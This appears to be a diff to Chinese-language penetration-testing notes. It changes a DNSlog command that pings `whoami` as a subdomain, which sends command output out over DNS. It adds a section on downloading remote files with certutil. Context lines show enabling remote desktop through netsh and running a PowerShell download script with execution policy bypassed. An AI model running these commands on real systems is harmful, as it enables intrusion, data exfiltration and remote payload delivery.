@@ -208,7 +208,10 @@ netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 
 比如linux,
 ```
- ping `whoami`.u9xpbt.dnslog.cn
+ ping `whoami`.dqua8k.dnslog.cn
+
+
+
 ```
 
 
@@ -274,3 +277,14 @@ echo $webclient.DownloadFile($url,$file) >>wget.ps1
 目标机执行:
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 
+
+
+
+
+### 远程下载
+
+certutil 还可用于从互联网下载文件。
+
+```
+certutil.exe -urlcache -split -f http://example.com/a.txt
+```
